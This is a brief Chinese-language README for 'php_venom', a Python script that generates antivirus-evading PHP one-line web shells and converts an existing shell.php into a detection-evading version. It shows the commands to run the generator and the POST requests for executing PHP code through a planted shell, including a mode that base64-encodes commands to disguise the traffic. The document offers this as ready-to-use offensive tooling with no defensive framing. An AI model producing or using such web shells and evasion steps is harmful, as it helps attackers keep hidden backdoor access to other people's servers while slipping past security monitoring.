
## 使用方法
```
python3 php_venom_3.3.py    //生成免杀一句话

python3 php_venom_3.3.py shell.php   //对同目录下shell.php进行免杀处理，结果保存在shell.php.bypass.php
```
   
## 3.x 使用说明：
 
 是否传入id参数决定是否把流量编码
 
 ```
http://www.xxx.com/shell.php  
POST: mr6=phpinfo();  //与普通shell相同

http://www.xxx.com/shell.php?id=xxx(xxxx随便修改)
POST: mr6=cGhwaW5mbygpOwo=  //payload的base64编码

```

 

